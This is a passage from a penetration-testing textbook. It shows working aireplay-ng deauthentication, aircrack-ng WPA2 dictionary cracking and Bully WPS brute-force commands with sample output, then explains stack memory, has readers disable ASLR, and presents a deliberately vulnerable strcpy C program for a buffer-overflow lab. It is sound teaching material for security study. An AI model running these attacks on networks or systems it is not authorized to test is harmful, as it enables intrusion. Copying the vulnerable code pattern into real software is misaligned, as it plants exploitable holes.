between the client and access point. The Aireplay-ng options we’ll need are:
• -0 means deauthentication.
• 1 is the number of deauthentication requests to send.
• -a 00:14:6C:7E:40:80 is the MAC address of the base station.
• -c 00:0F:B5:FD:FB:C2 is the MAC address of the client to deauthenticate.
Listing 15-13 shows the aireplay-ng command and the deauthentication
request.
root@kali:~# aireplay-ng -0 1 -a 00:23:69:F5:B4:2B -c 70:56:81:B2:F0:53 mon0
16:35:11 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
16:35:14 Sending 64 directed DeAuth. STMAC: [70:56:81:B2:F0:53] [24|66 ACKs]
Listing 15-13: Sending a deauthentication request to a client
Now we return to the Airodump-ng window, as shown in Listing 15-14.
CH 6 ][ Elapsed: 2 mins ][ 2015-11-23 17:10 ][ WPA handshake: 00:23:69:F5:B4:2B u
BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
00:23:69:F5:B4:2B -51 100 774 363 18 6 54 . WPA2 CCMP PSK linksys
354 Chapter 15
BSSID STATION PWR Rate Lost Frames Probe
00:23:69:F5:B4:2B 70:56:81:B2:F0:53 -29 1 - 1 47 457
Listing 15-14: WPA2 handshake captured in Airodump-ng
If the Airodump-ng capture sees a four-way handshake with a client, it
records it in the first line of the captured output u.
Once you’ve captured the WPA2 handshake, close Airodump-ng, and
open the .cap file in Wireshark with File4Open4filename.cap. Once in
Wireshark, filter for the eapol protocol to see the four packets that make
up the handshake, as shown in Figure 15-8.
Figure 15-8: WPA2 handshake packets in Wireshark
note Sometimes Aircrack-ng will claim that the handshake has been captured, but when
you look at the packets in Wireshark, you will see you do not have all four messages. If
this is the case, run the deauthentication attack again, as you will need all four mes-
sages to attempt to guess the correct key.
Now we create a wordlist like the ones we used in Chapter 9, making
sure that the correct WPA2 key is included in the list. The success of our
attack against WPA2 is contingent on our ability to compare the hashed
values for our passphrase with the values in the handshake.
Once we have the handshake, we can do the rest of the calculations
to recover the key offline; we no longer need to be in range of the access
point or send it any packets. Next we use Aircrack-ng to test the keys in
the wordlist, specifying a list with the -w option, as shown in Listing 15-15.
Otherwise, the command is identical to cracking the WEP key. If the cor-
rect key is in the wordlist, it will be recovered with Aircrack-ng.
Wireless Attacks 355
root@kali:~# aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap
Opening pentestbook2-01.cap
Reading packets, please wait...
Aircrack-ng 1.2 beta2
[00:00:00] 1 keys tested (178.09 k/s)
KEY FOUND! [ GeorgiaIsAwesome ] u
Master Key : 2F 8B 26 97 23 D7 06 FE 00 DB 5E 98 E3 8A C1 ED
9D D9 50 8E 42 EE F7 04 A0 75 C4 9B 6A 19 F5 23
Transient Key : 4F 0A 3B C1 1F 66 B6 DF 2F F9 99 FF 2F 05 89 5E
49 22 DA 71 33 A0 6B CF 2F D3 BE DB 3F E1 DB 17
B7 36 08 AB 9C E6 E5 15 5D 3F EA C7 69 E8 F8 22
80 9B EF C7 4E 60 D7 9C 37 B9 7D D3 5C A0 9E 8C
EAPOL HMAC : 91 97 7A CF 28 B3 09 97 68 15 69 78 E2 A5 37 54
Listing 15-15: Recovering a WPA2 key with Aircrack-ng
As you can see, the correct key is in our wordlist and is recovered u.
This sort of dictionary attack against WPA/WPA2 can be prevented by
using a strong passphrase, as discussed in Chapter 9.
Aircrack-ng is just one suite of tools for cracking wireless. It is ideal for
beginners, because starting different tools for each step of the process will
help you become familiar with how these attacks work. Other widely used
Wi-Fi auditing tools that you may encounter are Kismet and Wifite.
wi-Fi Protected setup
Wi-Fi Protected Setup (WPS) was designed to allow users to attach their
devices to secure networks with an eight-digit pin instead of a potentially
long and complicated passphrase. When the correct pin is supplied, the
access point sends over the passphrase.
Problems with WPS
The last digit of the pin is a checksum for the previous seven digits, so the
keyspace should be 107, or 10,000,000 possible pins. However, when a pin
is sent to the access point by the client, the validity of the first four digits
and second four digits is reported separately. The first four digits are all
in play, so there are 10,000 possibilities. Of the second four digits, only
the first three are in play (1000 possible guesses), so it would take at most
11,000 guesses to brute-force the correct WPS pin. This decreases the time
required to brute-force to under four hours. The only way to fix this issue is
to disable WPS on the access point.
356 Chapter 15
Cracking WPS with Bully
Kali provides tools that you can use to implement a brute-force attack
against WPS. One such tool is Bully. We can use Bully to brute-force the
WPS pin as well as test a specific pin. To use Bully we need the SSID, MAC
address, and channel of the access point, which we found with iwlist at the
beginning of this chapter. Use the -b flag to specify the MAC address, the
-e flag for the SSID, and the -c flag for the channel, as shown here.
root@kali:~# bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6
Bully should be able to brute-force the pin in around four hours and
recover the correct pre-shared PIN. WPS is enabled by default on many
wireless access points and may be an easier way in than guessing a strong
WPA/WPA2 passphrase.
summary
Wireless security is an often-overlooked piece of an organization’s security
posture. Time and money are put into securing the perimeter, deploy-
ing the latest firewalls and intrusion-prevention systems, but all this is for
naught if an attacker can just sit at the coffee shop across the street with
a strong antenna and join your corporate network. Wireless connections
may save corporations from lawsuits by distracted employees tripping over
Ethernet wires, but they introduce potential security vulnerabilities and
should be audited regularly. In this chapter, we used Aircrack-ng to recover
WEP and WPA2 personal wireless keys by eavesdropping on and injecting
traffic into a wireless network, and we used Bully to brute-force a WPS pin.
Wireless Attacks 357
PaRT IV
e xPloit De VeloPment
16
a staCk-BaseD Buffer
oVerflow in linux
So far we’ve used tools such as Metasploit and public
exploit code on the Internet to exploit our target sys-
tems. But you may find a vulnerability in your pentest-
ing career that has no such exploit code, or you may
discover a new security issue and want to write your
own exploit code for it. In this chapter and the next
three, we will look at the basics of writing our own exploits. We won’t cover
everything through the latest and greatest iPhone jailbreak, but we will look
at some real-world examples of vulnerable programs and learn how to write
working exploits for them by hand.
We’ll begin with a simple vulnerable program on our Linux target and
make the program do something its developer never intended.
note All of the examples in Chapters 16 through 19 use x86 architecture.
memory theory
Before we dive into writing our own exploits, we need to get a handle on
the basics of how memory works. Our goal is to manipulate memory and
trick the CPU into executing instructions on our behalf. We’ll use a tech-
nique called a stack-based buffer overflow, which involves overfilling a variable
on the program’s memory stack and overwriting adjacent memory locations.
But first, we need to know a little bit about how a program’s memory is laid
out, as shown in Figure 16-1.
low memory
text
data
heap
unused memory
stack
high memory
Figure 16-1: Memory visualization
The text segment contains the program code to be executed, while
the data segment contains global information for the program. At higher
addresses, we have a portion shared by the stack and heap, which are allo-
cated at runtime. The stack is fixed in size and is used to store function
arguments, local variables, and so on. The heap holds dynamic variables.
The stack consumption increases as more functions or subroutines are
called, and the top of the stack points at lower memory addresses as more
data is stored on the stack.
Our Intel-based CPU has general-purpose registers where it can store
data for future use. These include:
EIP instruction pointer
ESP stack pointer
EBP base pointer
ESI source index
EDI destination index
EAX accumulator
EBX base
362 Chapter 16
ECX counter
EDX data
ESP, EBP, and EIP are particularly interesting to us. ESP and EBP
together keep track of the stack frame of the currently executing function.
As shown in Figure 16-2, ESP points to the top of the stack frame at its
lowest memory address, and likewise, EBP points to the highest memory
address at the bottom of the stack frame. EIP holds the memory address of
the next instruction to be executed. Because our goal is to hijack execution
and make the target machine execute what we want, EIP seems like a prime
target for compromise. But how do we get our instructions to EIP? EIP is
read only, so we can’t just put a memory address to be executed in this regis-
ter; we will need to be a bit cleverer.
low memory
ESP
main’s stack frame
EBP
high memory
Figure 16-2: Stack frame
The stack is a last-in, first-out data structure. You can think of it like a
stack of lunch trays at a cafeteria. The last tray that is added to the stack is
the first tray that is taken off when one is needed. To add data to the stack,
a PUSH instruction is used. Likewise, to remove data from the stack, we use a
POP instruction. (Remember that the stack consumption increases to lower
memory addresses, so when data is pushed onto the current stack frame,
ESP moves to a lower address in memory.)
When a program function is executed, a stack frame for its informa-
tion (such as local variables) is pushed onto the stack. Once the function
finishes executing, the entire stack frame is unwound, ESP and EBP point
back to the caller function’s stack frame, and execution continues in the
caller function where it left off. However, the CPU must know where in
memory to continue from, and it obtains that information from the return
address, which is pushed onto the stack when a function is called.
Say, for instance, that we are running a C program. Naturally, the func-
tion main is called when the program begins, and a stack frame is allocated
for it. main then calls another function, function1. Before pushing a stack
frame for function1 onto the stack and handing over execution, main notes
where execution will need to continue when function1 returns (typically the
line of code directly after the call to function1) by pushing this value—its
return address—onto the stack. Figure 16-3 shows the stack after main’s call
to function1.
A Stack-Based Buffer Overflow in Linux 363
low memory
ESP
function1’s stack frame
EBP Saved EBP from main
return address
main’s stack frame
high memory
Figure 16-3: Stack after call to function1
After function1 finishes, it returns, its stack frame is unwound, and the
stored return address is loaded into the EIP register to restore execution
to main. If we can control that return address, we can dictate which instruc-
tions are executed when function1 returns. In the next section, we’ll look
at a simple stack-based buffer overflow example to illustrate this point.
Keep in mind a couple more things before we continue. In the
examples in this book, we’re using older operating systems to get around
some advanced antiexploitation techniques found on the most modern ver-
sions of both Windows and Linux. Particularly, we’ll take advantage of
the lack of data execution prevention (DEP) and address space layout random-
ization (ASLR), because both of them would make it difficult to learn the
basics of exploitation. DEP sets specific memory sections as nonexecutable,
which stops us from filling our stack with shellcode and pointing EIP to
it for execution (as you’ll see in the Windows buffer overflow example in
Chapter 17). ASLR randomizes where our libraries are loaded in memory.
In our examples, we’ll hardcode the return address to where we would like
to go in memory, but in the post-ASLR exploit world, finding the correct
place to send execution can be a bit trickier. We’ll touch on more advanced
exploit-writing techniques in Chapter 19, but for now let’s get comfortable
with the basics of how stack-based buffer overflows work.
Linux Buffer overflow
Now that we’re done with the mind-numbing theory, let’s see a basic example
of a buffer overflow exploit in action on our Linux target. First, let’s make
sure the target is set up correctly for a basic buffer overflow. Modern oper-
ating systems have checks in place to prevent these attacks, but while we are
learning, we need to turn them off. If you’re using the Linux target image
provided with this book, it’s already set up correctly, but to make sure,
check that randomize_va_space is set to 0 as shown here.
364 Chapter 16
georgia@ubuntu:~$ sudo nano /proc/sys/kernel/randomize_va_space
randomize_va_space, when set to 1 or 2, turns on ASLR on our target sys-
tem. By default, randomization is turned on in Ubuntu, but we need this
feature off for our example. If the file includes the value 0, we’re all set. If
not, change the file contents to 0 and save it.
A Vulnerable Program
Let’s write a simple C program called overflowtest.c that is vulnerable to a
stack-based buffer overflow, as shown in Listing 16-1.
note This file is in georgia’s home directory on the Ubuntu target included in the book’s
downloads.
georgia@ubuntu:~$ nano overflowtest.c
#include 
#include 
u void overflowed() {
printf("%s\n", "Execution Hijacked");
}
v void function1(char *str){
char buffer[5];
strcpy(buffer, str);
}
w void main(int argc, char *argv[])
{
function1(argv[1]);
printf("%s\n", "Executed normally");
}
Listing 16-1: Simple exploitable C program
Our simple C program doesn’t do very much. It starts off by including
two C libraries, stdio.h and string.h. These allow us to use the standard
input/output and string constructors in C without having to build them
from scratch. We’ll want to use strings and output text to the console in our
program.
Next we have three functions: overflowed, function1, and main. If overflowed
u is called, it prints the text “Execution Hijacked” to the console and then
returns. If function1 v is called, it declares a local variable, a five-character
string called buffer, and copies the contents of a variable passed to function1
into buffer. Called by default when the program starts, main w calls function1
and passes it the first command line argument the program received. After
function1 returns, main prints the text “Executed normally” to the console,
and the program exits.
A Stack-Based Buffer Overflow in Linux 365
Notice that under normal circumstances, overflowed is never called, so
“Execution Hijacked” should never appear in the console. (You’ll learn why
it’s in the program at all when we overflow the buffer and hijack control of
the program.)
Now we compile our program as shown here.